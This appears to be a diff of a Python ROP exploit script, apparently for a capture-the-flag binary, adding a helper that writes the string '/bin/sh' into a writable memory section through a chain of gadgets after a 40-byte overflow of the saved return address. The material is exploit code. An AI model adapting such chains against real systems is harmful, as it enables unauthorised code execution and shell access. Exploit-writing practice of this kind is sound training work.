@@ -64,11 +64,11 @@ print(msg)
 # that will overwrithe the saved RIP.
 vector = "B" * 40
 
-def append_write(chain, address, value):
+def append_write(chain, addr, value):
     # Return address of the gadget "pop r14; pop r15; ret;"
     chain += p64(0x400890)
     # The values for r14
-    chain += p64(address)
+    chain += p64(addr)
     # The values for r15
     chain += p64(value)
     # Return address of the gadget "mov qword ptr [r14], r15; ret;"
@@ -76,8 +76,18 @@ def append_write(chain, address, value):
 
     return chain
 
+def write_string(chain, addr, s):
+    s += '\x00' * (8 - (len(s) % 8))
+    i = 0
+    while i < len(s):
+        chain = append_write(chain, addr + i, u64(s[i:i+8]))
+        i += 8
+
+    return chain
+
 dest_addr = 0x601000   # begin of a writable section
-vector = append_write(vector, dest_addr, u64('/bin/sh\x00'))
+
+vector = write_string(vector, dest_addr, '/bin/sh')
 
 # Append the address of a 'pop rdi; ret' gadget,
 # and the value of rdi (address of the crafted string).
